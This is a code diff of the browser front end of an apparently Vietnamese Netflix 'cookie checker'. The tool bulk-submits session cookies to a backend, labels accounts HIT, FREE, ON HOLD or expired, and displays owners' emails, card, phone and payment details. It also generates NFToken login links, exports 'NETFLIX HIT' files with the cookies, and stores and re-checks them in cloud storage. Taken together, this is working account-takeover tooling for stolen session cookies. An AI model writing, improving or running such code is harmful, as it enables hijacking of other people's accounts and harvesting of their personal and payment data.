+  const btn=document.getElementById('checkBtn'); btn.disabled=true; btn.textContent='Đang check…'; running=true;
   const cfg=getConfig();
-  chunks.forEach((c,i)=>{
-    results.push({id:i,raw:c.raw,label:c.label,status:'checking',info:null,nftoken:null,txt:null,netscape:null,error:null});
-    renderCard(results[i]);
-  });
+  chunks.forEach((c,i)=>{ results.push({id:i,raw:c.raw,label:c.label,status:'checking',info:null,nftoken:null,txt:null,netscape:null,error:null}); renderCard(results[i]); });
 
   let idx=0;
-  async function runNext(){
-    while(idx<chunks.length){
-      const i=idx++;
-      await checkOne(workerUrl,i,chunks[i].raw,cfg);
-      updateProgress(i+1,chunks.length);
-    }
-  }
+  async function runNext(){ while(idx<chunks.length){ const i=idx++; await checkOne(workerUrl,i,chunks[i].raw,cfg); updateProgress(i+1,chunks.length); } }
   await Promise.all(Array.from({length:Math.min(5,chunks.length)},runNext));
 
-  btn.disabled=false;btn.textContent='▶ Check Cookie';running=false;
-  document.getElementById('progressLabel').textContent=`Hoàn tất — ${chunks.length} cookie.`;
+  btn.disabled=false; btn.textContent='▶ Check Cookie'; running=false; document.getElementById('progressLabel').textContent=`Hoàn tất — ${chunks.length} cookie.`;
   if(results.some(r=>['hit','free','hold'].includes(r.status))) document.getElementById('exportBar').style.display='flex';
 }
 
 async function checkOne(wUrl,i,raw,cfg){
   try{
     const token = localStorage.getItem('nf_app_token');
-    const res=await fetch(wUrl,{
-      method:'POST',
-      headers:{ 'Content-Type':'application/json', 'Authorization': `Bearer ${token}` },
-      body:JSON.stringify({cookie:raw,config:cfg}),
-    });
-    
-    if (res.status === 401) {
-      results[i].status='err';
-      results[i].error='Hết hạn phiên. Vui lòng đăng xuất và đăng nhập lại.';
-      counts[results[i].status]=(counts[results[i].status]||0)+1;
-      updateStats();refreshCard(i);
-      return;
-    }
-
+    const res=await fetch(wUrl,{ method:'POST', headers:{ 'Content-Type':'application/json', 'Authorization': `Bearer ${token}` }, body:JSON.stringify({cookie:raw,config:cfg}), });
+    if (res.status === 401) { results[i].status='err'; results[i].error='Hết hạn phiên. Vui lòng F5.'; counts[results[i].status]=(counts[results[i].status]||0)+1; updateStats(); refreshCard(i); return; }
     const data=await res.json();
-    if(!data.ok){
-      results[i].status=data.result==='EXPIRED'?'dead':'err';
-      results[i].error=data.error||data.reason||'Error';
-    } else {
-      const r=data.result;
-      results[i].status = data.is_on_hold?'hold': r==='HIT'?'hit': r==='FREE'?'free':'dead';
-      results[i].info   = data.info;
-      results[i].nftoken= data.nftoken||null;
-      results[i].txt    = data.txt_file||null;
-      results[i].netscape=data.netscape||null;
-    }
-  }catch(e){
-    results[i].status='err';
-    results[i].error=e.message||'Network error';
-  }
-  counts[results[i].status]=(counts[results[i].status]||0)+1;
-  updateStats();refreshCard(i);
+    if(!data.ok){ results[i].status=data.result==='EXPIRED'?'dead':'err'; results[i].error=data.error||data.reason||'Error'; }
+    else { const r=data.result; results[i].status = data.is_on_hold?'hold': r==='HIT'?'hit': r==='FREE'?'free':'dead'; results[i].info = data.info; results[i].nftoken= data.nftoken||null; results[i].txt = data.txt_file||null; results[i].netscape=data.netscape||null; }
+  }catch(e){ results[i].status='err'; results[i].error=e.message||'Network error'; }
+  counts[results[i].status]=(counts[results[i].status]||0)+1; updateStats(); refreshCard(i);
 }
 
-function updateProgress(done,total){
-  document.getElementById('progressBar').style.width=Math.round(done/total*100)+'%';
-  document.getElementById('progressLabel').textContent=`Đang check ${done}/${total}…`;
-}
-function updateStats(){
-  document.getElementById('sHit').textContent=counts.hit;
-  document.getElementById('sFree').textContent=counts.free;
-  document.getElementById('sHold').textContent=counts.hold;
-  document.getElementById('sDead').textContent=counts.dead;
-  document.getElementById('sErr').textContent=counts.err;
-}
+function updateProgress(d,t){ document.getElementById('progressBar').style.width=Math.round(d/t*100)+'%'; document.getElementById('progressLabel').textContent=`Đang check ${d}/${t}…`; }
+function updateStats(){ document.getElementById('sHit').textContent=counts.hit; document.getElementById('sFree').textContent=counts.free; document.getElementById('sHold').textContent=counts.hold; document.getElementById('sDead').textContent=counts.dead; document.getElementById('sErr').textContent=counts.err; }
 
 function renderCard(r){
-  const el=document.createElement('div');
-  el.className='result-card checking';el.id=`card-${r.id}`;
+  const el=document.createElement('div'); el.className='result-card checking'; el.id=`card-${r.id}`;
   el.innerHTML=`<div class="result-header" onclick="toggleDetail(${r.id})"><span class="status-badge"><span class="spinner"></span></span><span class="result-summary"><span class="dim">${esc(r.label)} — Đang quét…</span></span><button class="toggle-btn">▾</button></div><div class="result-detail" id="detail-${r.id}"></div>`;
   document.getElementById('results').prepend(el);
 }
 
 function refreshCard(i){
-  const r=results[i];
-  const card=document.getElementById(`card-${r.id}`);
-  if(!card) return;
-  card.className=`result-card ${r.status}`;
+  const r=results[i]; const card=document.getElementById(`card-${r.id}`); if(!card) return; card.className=`result-card ${r.status}`;
   const badges={hit:'✅ HIT',free:'🟡 FREE',hold:'⏸ ON HOLD',dead:'❌ EXPIRED',err:'⚠ ERROR'};
   const sums={
     hit: ()=>`${esc(r.info?.plan||'?')} <span class="dim">${esc(r.info?.country||'')} · ${esc(r.info?.email||'')}</span>`,
     free:()=>`Free Account <span class="dim">${esc(r.info?.country||'')} · ${esc(r.info?.membership_status||'')}</span>`,
     hold:()=>`On Hold <span class="dim">${esc(r.info?.country||'')} · ${esc(r.info?.plan||'')}</span>`,
-    dead:()=>`<span class="dim">${esc(r.error||'Cookie expired')}</span>`,
-    err: ()=>`<span class="dim">${esc(r.error||'Error')}</span>`,
+    dead:()=>`<span class="dim">${esc(r.error||'Cookie expired')}</span>`, err: ()=>`<span class="dim">${esc(r.error||'Error')}</span>`,
   };
   card.querySelector('.result-header').innerHTML=`<span class="status-badge">${badges[r.status]||r.status}</span><span class="result-summary">${sums[r.status]?.()??''}</span><button class="toggle-btn" onclick="event.stopPropagation();toggleDetail(${r.id})">▾</button>`;
   card.querySelector('.result-header').onclick=()=>toggleDetail(r.id);
-  if(['hit','free','hold'].includes(r.status)){
-    buildDetail(r.id);
-    document.getElementById(`detail-${r.id}`).classList.add('open');
-  }
+  if(['hit','free','hold'].includes(r.status)){ buildDetail(r.id); document.getElementById(`detail-${r.id}`).classList.add('open'); }
 }
 
-function toggleDetail(id){
-  const d=document.getElementById(`detail-${id}`);
-  if(!d.classList.contains('open')) buildDetail(id);
-  d.classList.toggle('open');
-}
+function toggleDetail(id){ const d=document.getElementById(`detail-${id}`); if(!d.classList.contains('open')) buildDetail(id); d.classList.toggle('open'); }
 
-function buildDetail(id){
-  const r=results[id];
-  const d=document.getElementById(`detail-${id}`);
-  if(!r) return;
-  if(r.status==='err'||r.status==='dead'){
-    d.innerHTML=`<div style="padding:12px 0;font-size:12px;color:var(--muted)">${esc(r.error||'Cookie expired or invalid.')}</div>`;
-    return;
-  }
-  const info=r.info||{};
-  const cfg=getConfig();
-  const tf=cfg.txt_fields||{};
+function getDetailHTML(r, isCloud = false) {
+  const info=r.info||{}; const cfg=getConfig(); const tf=cfg.txt_fields||{};
   const FREE_HIDDEN=new Set(['member_since','next_billing','payment_method','card','phone','quality','max_streams','plan_price','extra_members','membership_status']);
   const sub=['hit','hold'].includes(r.status);
   const profileLabel=info.profile_count?`Profiles (${info.profile_count})`:'Profiles';
 
   const ROWS=[
-    ['name','👤 Name'],['email','📧 Email'],['country','🌍 Country'],['plan','📦 Plan'],
-    ['member_since','📅 Member Since'],['next_billing','🗓️ Next Billing'],
-    ['payment_method','💳 Payment'],['card','💳 Card'],['phone','📱 Phone'],
-    ['quality','🎞️ Quality'],['max_streams','📺 Streams'],['plan_price','💰 Price'],
-    ['hold_status','⏸️ Hold Status'],['extra_members','👥 Extra Member'],
-    ['email_verified','✅ Email Verified'],['membership_status','🛡️ Membership Status'],
+    ['name','👤 Name'],['email','📧 Email'],['country','🌍 Country'],['plan','📦 Plan'],['member_since','📅 Member Since'],['next_billing','🗓️ Next Billing'],
+    ['payment_method','💳 Payment'],['card','💳 Card'],['phone','📱 Phone'],['quality','🎞️ Quality'],['max_streams','📺 Streams'],['plan_price','💰 Price'],
+    ['hold_status','⏸️ Hold Status'],['extra_members','👥 Extra Member'],['email_verified','✅ Email Verified'],['membership_status','🛡️ Membership Status'],
     ['profiles',`🎭 ${profileLabel}`],['user_guid','🆔 User GUID']
   ];
   const rows=ROWS.filter(([k])=>{
-    if(!sub&&FREE_HIDDEN.has(k)) return false;
-    if(k==='card'&&info.payment_method!=='CC') return false;
-    if(k==='extra_members'&&info.extra_members!=='Yes') return false;
-    if(k==='hold_status'&&!['Yes','No'].includes(info.hold_status)) return false;
+    if(!sub&&FREE_HIDDEN.has(k)) return false; if(k==='card'&&info.payment_method!=='CC') return false;
+    if(k==='extra_members'&&info.extra_members!=='Yes') return false; if(k==='hold_status'&&!['Yes','No'].includes(info.hold_status)) return false;
     return tf[k]!==false;
   });
 
-  const country=info.country||'';
-  const flag=countryFlag(country);
-  const grid=rows.map(([k,l])=>{
-    let v=info[k]||'—';
-    if(k==='country'&&flag) v=`${v} ${flag}`;
-    return `<div class="info-key">${l}</div><div class="info-val">${esc(v)}</div>`;
-  }).join('');
+  const country=info.country||''; const flag=countryFlag(country);
+  const grid=rows.map(([k,l])=>{ let v=info[k]||'—'; if(k==='country'&&flag) v=`${v} ${flag}`; return `<div class="info-key">${l}</div><div class="info-val">${esc(v)}</div>`; }).join('');
 
-  let nftHtml='';
-  const nft=r.nftoken;
+  let nftHtml=''; const nft=r.nftoken;
   if(nft&&nft.token){
-    const t=nft.token;
-    const exp=nft.expires_at_utc||'—';
-    const pcUrl=`https://netflix.com/?nftoken=${encodeURIComponent(t)}`;
-    const mobUrl=`https://netflix.com/unsupported?nftoken=${encodeURIComponent(t)}`;
+    const t=nft.token; const exp=nft.expires_at_utc||'—';
+    const pcUrl=`https://netflix.com/?nftoken=${encodeURIComponent(t)}`; const mobUrl=`https://netflix.com/unsupported?nftoken=${encodeURIComponent(t)}`;
     nftHtml=`<div class="nft-section"><div class="nft-title">🔑 NFToken</div><div class="nft-links"><a class="nft-link" href="${esc(pcUrl)}" target="_blank">🖥️ PC Login</a><a class="nft-link" href="${esc(mobUrl)}" target="_blank">📱 Phone Login</a></div><div class="nft-expiry">Valid Till (UTC): ${esc(exp)}</div></div>`;
   }
 
   const dlName=`netflix_${country||'xx'}_${Date.now()}.txt`;
   const dlContent=r.txt||buildFallbackTxt(r);
+  
+  let btns = `<button class="btn-action btn-copy" onclick="copyText(this,${JSON.stringify(r.netscape||'')})">📋 Copy Cookie</button><button class="btn-action btn-dl" onclick="dlFile(${JSON.stringify(dlName)},${JSON.stringify(dlContent)})">⬇ Save .txt</button>`;
+  if(!isCloud) btns += `<button class="btn-action" style="background:var(--blue-dim);border:1px solid var(--blue);color:var(--blue)" onclick="saveCookieToCloud(${r.id})">☁️ Lưu Cloud</button>`;
+  return `<div class="info-grid">${grid}</div>${nftHtml}<div class="action-row">${btns}</div>`;
+}
 
-  d.innerHTML=`<div class="info-grid">${grid}</div>${nftHtml}<div class="action-row"><button class="btn-action btn-copy" onclick="copyText(this,${JSON.stringify(r.netscape||'')})">📋 Copy Cookie</button><button class="btn-action btn-dl" onclick="dlFile(${JSON.stringify(dlName)},${JSON.stringify(dlContent)})">⬇ Save .txt</button><button class="btn-action" style="background:var(--blue-dim);border:1px solid var(--blue);color:var(--blue)" onclick="saveCookieToCloud(${r.id})">☁️ Lưu Cloud</button></div>`;
+function buildDetail(id){
+  const r=results[id]; const d=document.getElementById(`detail-${id}`); if(!r) return;
+  if(r.status==='err'||r.status==='dead'){ d.innerHTML=`<div style="padding:12px 0;font-size:12px;color:var(--muted)">${esc(r.error||'Cookie expired or invalid.')}</div>`; return; }
+  d.innerHTML = getDetailHTML(r, false);
 }
 
 function buildFallbackTxt(r){
-  const info=r.info||{};
-  const sub=['hit','hold'].includes(r.status);
+  const info=r.info||{}; const sub=['hit','hold'].includes(r.status);
   const lines=[`NETFLIX ${sub?'HIT':'FREE'} :👇`,'',`Country: ${info.country||'UNKNOWN'}`,`Plan: ${info.plan||'UNKNOWN'}`,`Quality: ${info.quality||'UNKNOWN'}`,`Streams: ${info.max_streams||'UNKNOWN'}`,`Price: ${info.plan_price||'N/A'}`,`Email: ${info.email||'UNKNOWN'}`];
-  lines.push('','-'.repeat(98),'','Netflix COOKIE :👇','',(r.netscape||'').trim(),'');
-  return lines.join('\n');
+  lines.push('','-'.repeat(98),'','Netflix COOKIE :👇','',(r.netscape||'').trim(),''); return lines.join('\n');
 }
 
 function exportTxt(type){
   const f=type==='all'?results.filter(r=>['hit','free','hold'].includes(r.status)):results.filter(r=>r.status===type);
-  if(!f.length){toast('Không có kết quả.');return;}
-  const sep='\n\n'+'='.repeat(98)+'\n\n';
-  dlFile(`netflix_${type}_${Date.now()}.txt`,f.map(r=>r.txt||buildFallbackTxt(r)).join(sep));
+  if(!f.length){toast('Không có kết quả.');return;} const sep='\n\n'+'='.repeat(98)+'\n\n'; dlFile(`netflix_${type}_${Date.now()}.txt`,f.map(r=>r.txt||buildFallbackTxt(r)).join(sep));
 }
-function dlFile(name,content){
-  const a=document.createElement('a');
-  a.href=URL.createObjectURL(new Blob([content],{type:'text/plain'}));
-  a.download=name;a.click();
-}
-
-function countryFlag(code){
-  if(!code||code.length!==2) return '';
-  return[...code.toUpperCase()].map(c=>String.fromCodePoint(127397+c.charCodeAt(0))).join('');
-}
+function dlFile(name,content){ const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([content],{type:'text/plain'})); a.download=name; a.click(); }
+function countryFlag(code){ if(!code||code.length!==2) return ''; return[...code.toUpperCase()].map(c=>String.fromCodePoint(127397+c.charCodeAt(0))).join(''); }
 function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
-function copyText(btn,text){
-  navigator.clipboard.writeText(text).then(()=>{
-    btn.textContent='✓ Copied!';btn.classList.add('copied');
-    setTimeout(()=>{ btn.textContent='📋 Copy Cookie';btn.classList.remove('copied'); },1800);
-  });
-}
+function copyText(btn,text){ navigator.clipboard.writeText(text).then(()=>{ btn.textContent='✓ Copied!'; btn.classList.add('copied'); setTimeout(()=>{ btn.textContent='📋 Copy Cookie'; btn.classList.remove('copied'); },1800); }); }
 function clearAll(){
-  if(running) return;
-  document.getElementById('cookieInput').value='';
-  document.getElementById('results').innerHTML='';
-  document.getElementById('statsRow').style.display='none';
-  document.getElementById('exportBar').style.display='none';
-  document.getElementById('progressWrap').style.display='none';
-  document.getElementById('progressLabel').style.display='none';
-  loadedFiles=[];renderFileTags();
-  results=[];counts={hit:0,free:0,hold:0,dead:0,err:0};updateStats();
+  if(running) return; document.getElementById('cookieInput').value=''; document.getElementById('results').innerHTML='';
+  document.getElementById('statsRow').style.display='none'; document.getElementById('exportBar').style.display='none';
+  document.getElementById('progressWrap').style.display='none'; document.getElementById('progressLabel').style.display='none';
+  loadedFiles=[]; renderFileTags(); results=[]; counts={hit:0,free:0,hold:0,dead:0,err:0}; updateStats();
 }
 function toast(msg){
-  const t=document.createElement('div');
-  Object.assign(t.style,{position:'fixed',bottom:'20px',left:'50%',transform:'translateX(-50%)',
-    background:'#222',border:'1px solid #444',color:'#eee',padding:'8px 18px',borderRadius:'4px',fontSize:'12px',zIndex:'99999'});
-  t.textContent=msg;document.body.appendChild(t);
-  setTimeout(()=>{t.remove();},2000);
+  const t=document.createElement('div'); Object.assign(t.style,{position:'fixed',bottom:'20px',left:'50%',transform:'translateX(-50%)', background:'#222',border:'1px solid #444',color:'#eee',padding:'8px 18px',borderRadius:'4px',fontSize:'12px',zIndex:'99999'});
+  t.textContent=msg; document.body.appendChild(t); setTimeout(()=>{t.remove();},2000);
 }
 
 // ════ CLOUD STORAGE LOGIC ════
 async function apiFetch(endpoint, method = 'GET', body = null) {
-  const wUrl = localStorage.getItem('nf_worker_url');
-  const token = localStorage.getItem('nf_app_token');
-  if(!wUrl || !token) return null;
-  const opts = { method, headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` } };
+  const wUrl = localStorage.getItem('nf_worker_url'); const token = localStorage.getItem('nf_app_token');
+  if(!wUrl || !token) return null; const opts = { method, headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` } };
   if(body) opts.body = JSON.stringify(body);
-  try {
-    const r = await fetch(`${wUrl}${endpoint}`, opts);
-    return await r.json();
-  } catch(e) { return { ok: false, error: e.message }; }
+  try { const r = await fetch(`${wUrl}${endpoint}`, opts); return await r.json(); } catch(e) { return { ok: false, error: e.message }; }
 }
 
 async function saveCookieToCloud(id) {
-  const r = results[id];
-  if(!r) return;
-  toast('Đang đẩy dữ liệu lên Cloud...');
+  const r = results[id]; if(!r) return; toast('Đang đẩy dữ liệu lên Cloud...');
   const label = r.info?.email || r.label || 'Saved Cookie';
-  const res = await apiFetch('/api/cloud/cookies', 'POST', {
-    netscape: r.netscape, label: label, status: r.status, info: r.info
-  });
-  if(res && res.ok) toast('Đã lưu thành công vào Cloudflare KV ✓');
-  else toast(`Thất bại: ${res?.error || 'Trùng lặp hoặc lỗi cấu hình'}`);
+  const res = await apiFetch('/api/cloud/cookies', 'POST', { netscape: r.netscape, label: label, status: r.status, info: r.info, nftoken: r.nftoken });
+  if(res && res.ok) toast('Đã lưu thành công vào Cloudflare KV ✓'); else toast(`Thất bại: ${res?.error || 'Lỗi'}`);
 }
 
 async function loadCloudCookies() {
   const cont = document.getElementById('cloudResults');
   cont.innerHTML = '<div style="text-align:center;padding:20px;"><span class="spinner"></span> Đang đồng bộ hóa...</div>';
   const res = await apiFetch('/api/cloud/cookies');
-  if(res && res.ok) {
-    cloudCookies = res.data;
-    renderCloudList();
-  } else {
-    cont.innerHTML = `<div style="color:var(--red);text-align:center;padding:20px;">Không thể tải dữ liệu từ Cloud KV.</div>`;
-  }
+  if(res && res.ok) { cloudCookies = res.data; renderCloudList(); } else { cont.innerHTML = `<div style="color:var(--red);text-align:center;padding:20px;">Không thể tải dữ liệu.</div>`; }
 }
 
 function renderCloudList() {
   const cont = document.getElementById('cloudResults');
   if(!cloudCookies.length) { cont.innerHTML = '<div style="text-align:center;font-size:11px;color:var(--muted);padding:20px;">Kho lưu trữ trống.</div>'; return; }
-  cont.innerHTML = cloudCookies.map((c) => {
-    const badge = c.status === 'hit' ? '<span style="color:var(--green)">✅ HIT</span>' :
-                  c.status === 'free' ? '<span style="color:var(--gold)">🟡 FREE</span>' :
-                  c.status === 'hold' ? '<span style="color:var(--hold)">⏸ HOLD</span>' : '<span style="color:var(--red)">❌ DEAD</span>';
+  cont.innerHTML = cloudCookies.map((c, idx) => {
+    const badge = c.status === 'hit' ? '<span style="color:var(--green)">✅ HIT</span>' : c.status === 'free' ? '<span style="color:var(--gold)">🟡 FREE</span>' : c.status === 'hold' ? '<span style="color:var(--hold)">⏸ HOLD</span>' : '<span style="color:var(--red)">❌ DEAD</span>';
     const checkDate = c.lastCheck ? new Date(c.lastCheck).toLocaleString() : new Date(c.savedAt).toLocaleString();
-    return `<div class="result-card ${c.status}" style="border-left-width:3px;" id="cloud-card-${c.id}"><div class="result-header" style="justify-content:space-between; cursor:default;"><div style="display:flex;gap:10px;align-items:center;overflow:hidden;"><span class="status-badge" style="background:#1a1a1a">${badge}</span><span class="result-summary">${esc(c.info?.plan || 'Free Account')} <span class="dim">· ${esc(c.info?.email || c.label)}</span></span></div><div style="display:flex;gap:5px;flex-shrink:0;"><button class="btn-action btn-copy" onclick="copyText(this, ${JSON.stringify(c.netscape)})" style="padding:5px 9px">📋 Copy</button><button class="btn-action" style="color:var(--red);border-color:var(--red);padding:5px 9px;" onclick="deleteCloudCookie('${c.id}')">✕ Xoá</button></div></div><div style="padding:0 16px 12px 16px;font-size:10px;color:var(--muted)">Đồng bộ cuối: ${checkDate}</div></div>`;
+    return `
+    <div class="result-card ${c.status}" style="border-left-width:3px;" id="cloud-card-${c.id}">
+      <div class="result-header" onclick="toggleCloudDetail(${idx})">
+        <div style="display:flex;gap:10px;align-items:center;overflow:hidden;flex:1">
+          <span class="status-badge" style="background:#1a1a1a">${badge}</span>
+          <span class="result-summary">${esc(c.info?.plan || 'Free Account')} <span class="dim">· ${esc(c.info?.email || c.label)}</span></span>
+        </div>
+        <div style="display:flex;gap:5px;flex-shrink:0;">
+          <button class="btn-action" style="color:var(--red);border-color:var(--red);padding:5px 9px;" onclick="event.stopPropagation(); deleteCloudCookie('${c.id}')">✕ Xoá</button>
+          <button class="toggle-btn" onclick="event.stopPropagation(); toggleCloudDetail(${idx})">▾</button>
+        </div>
+      </div>
+      <div class="result-detail" id="cloud-detail-${c.id}"></div>
+      <div style="padding:0 16px 12px 16px;font-size:10px;color:var(--muted)">Đồng bộ cuối: ${checkDate}</div>
+    </div>`;
   }).join('');
 }
 
+function toggleCloudDetail(idx) {
+  const c = cloudCookies[idx]; const d = document.getElementById(`cloud-detail-${c.id}`);
+  if(!d.classList.contains('open')) {
+    if(c.status === 'dead' || c.status === 'err') d.innerHTML=`<div style="padding:12px 0;font-size:12px;color:var(--muted)">Cookie expired or invalid.</div>`;
+    else d.innerHTML = getDetailHTML(c, true); 
+  }
+  d.classList.toggle('open');
+}
+
 async function deleteCloudCookie(id) {
-  if(!confirm("Bạn có chắc chắn muốn xóa cookie này khỏi hệ thống Cloud?")) return;
+  if(!confirm("Xóa cookie khỏi Cloud?")) return;
   const res = await apiFetch(`/api/cloud/cookies/${id}`, 'DELETE');
-  if(res && res.ok) { toast('Đã xoá dữ liệu trên KV ✓'); loadCloudCookies(); }
+  if(res && res.ok) { toast('Đã xoá ✓'); loadCloudCookies(); }
 }
 
 async function recheckAllCloud() {
   if(!cloudCookies.length) return toast("Không có cookie trong kho");
-  const wUrl = localStorage.getItem('nf_worker_url');
-  const token = localStorage.getItem('nf_app_token');
-  const cfg = getConfig();
-  toast('Bắt đầu Recheck tự động toàn kho...');
+  const wUrl = localStorage.getItem('nf_worker_url'); const token = localStorage.getItem('nf_app_token'); const cfg = getConfig();
+  toast('Bắt đầu Recheck tự động...');
   for(let i=0; i<cloudCookies.length; i++) {
-    const c = cloudCookies[i];
-    const card = document.getElementById(`cloud-card-${c.id}`);
+    const c = cloudCookies[i]; const card = document.getElementById(`cloud-card-${c.id}`);
     if(card) card.querySelector('.status-badge').innerHTML = '<span class="spinner"></span>';
     try {
       const res = await fetch(wUrl, { method:'POST', headers:{ 'Content-Type':'application/json', 'Authorization': `Bearer ${token}` }, body:JSON.stringify({cookie:c.netscape, config:cfg}) });
       const data = await res.json();
-      let newStatus = 'dead'; let newInfo = c.info;
+      let newStatus = 'dead'; let newInfo = c.info; let newNftoken = c.nftoken;
       if(data.ok) {
         newStatus = data.is_on_hold ? 'hold' : data.result === 'HIT' ? 'hit' : data.result === 'FREE' ? 'free' : 'dead';
-        if(data.info) newInfo = data.info;
+        if(data.info) newInfo = data.info; if(data.nftoken) newNftoken = data.nftoken;
       }
-      cloudCookies[i].status = newStatus; cloudCookies[i].info = newInfo; cloudCookies[i].lastCheck = Date.now();
-      await apiFetch('/api/cloud/cookies/update', 'POST', { id: c.id, status: newStatus, info: newInfo });
+      cloudCookies[i].status = newStatus; cloudCookies[i].info = newInfo; cloudCookies[i].nftoken = newNftoken; cloudCookies[i].lastCheck = Date.now();
+      await apiFetch('/api/cloud/cookies/update', 'POST', { id: c.id, status: newStatus, info: newInfo, nftoken: newNftoken });
       renderCloudList();
     } catch(e) { if(card) card.querySelector('.status-badge').innerHTML = '⚠ ERR'; }
   }
-  toast("Recheck và đồng bộ đám mây hoàn tất!");
+  toast("Recheck hoàn tất!");
 }
 </script>
 </body>
